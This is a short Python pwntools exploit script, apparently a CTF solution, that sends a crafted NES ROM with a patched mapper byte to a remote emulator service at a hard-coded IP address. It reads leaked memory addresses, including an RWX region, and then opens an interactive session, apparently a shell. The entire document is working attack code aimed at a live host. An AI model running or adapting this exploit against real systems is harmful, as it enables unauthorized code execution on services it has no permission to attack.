#!/usr/bin/env python

from pwn import *
from binascii import hexlify

#r = remote("localhost", 1337)
r = remote("91.107.157.58", 3000)

def leak():
    data = r.recvuntil(b"FF", drop=True).decode("utf-8").strip()
    if data:
        print(data)
    data = r.recvuntil(b"ABC",drop=True)
    return u64(data)

with open("./pwn.nes", "rb") as f:
    data = list(f.read())
    
    #patch in dream mapper
    data[6] = (data[6] & 0x0f) | (11 << 4) 

    to_send = hexlify(bytes(data))
    #log.info(f"sending data> {to_send}")

    r.sendlineafter(':\n', to_send)

    with open("./test.nes", "wb") as out:
        out.write(bytes(data))

    f.close()

data = leak()
log.info(f'leak: {hex(data)}')
data = leak()
log.info(f'rwx: {hex(data)}')
data = leak()
log.info(f'm_RAM: {hex(data)}')
data = leak()
log.info(f'm_RAM_rwx_off: {hex(data)}')

r.interactive()
#r.sendlineafter(b'GGGGG','ls')

